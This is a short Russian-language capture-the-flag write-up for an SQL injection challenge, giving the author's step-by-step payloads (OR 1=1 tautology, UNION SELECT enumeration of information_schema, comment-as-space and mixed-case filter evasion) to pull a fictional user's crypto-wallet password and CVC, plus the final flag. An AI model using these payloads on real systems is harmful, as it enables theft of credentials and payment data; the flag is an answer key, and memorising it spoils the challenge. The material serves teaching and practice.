# WriteUp: SQL_L3

Ниже — авторский ход решения (из исходных материалов).

```
Решение L3
Задание: Необходимо узнать пароль от криптокошелька и CVC-код пользователя данного сайта.
Нам известно только имя: Джонни Сильверхенд
ID криптокошелька: 651111111156
К сожалению иной информации у нас нет

Ход решения:

'/**/OR/**/1=1;#
'/**/unIon/**/sElect/**/table_name/**/From/**/information_schema.tables;#
'/**/unIon/**/sElect/**/column_name/**/From/**/information_schema.columns/**/where/**/table_name='2020_ActualCustomerCryptoWalletInfo';#


'/**/unIon/**/sElect/**/CryptoWalletPassword/**/From/**/2023_ActualCustomerCryptoWalletInfo/**/where/**/idOfCryptoWallet='651111111156';# 
'/**/unIon/**/sElect/**/CVC/**/From/**/2023_ActualCustomerCryptoWalletInfo/**/where/**/idOfCryptoWallet='651111111156';#

Ответ: CyBeRR_3077 и 358 (нужно взять из инструмента разработчика, так как сайт переводит все в UpperCase)
Пример флага: CTFKHV{Password_CVC}
Флаг: CTFKHV{CyBeRR_3077_358}
```
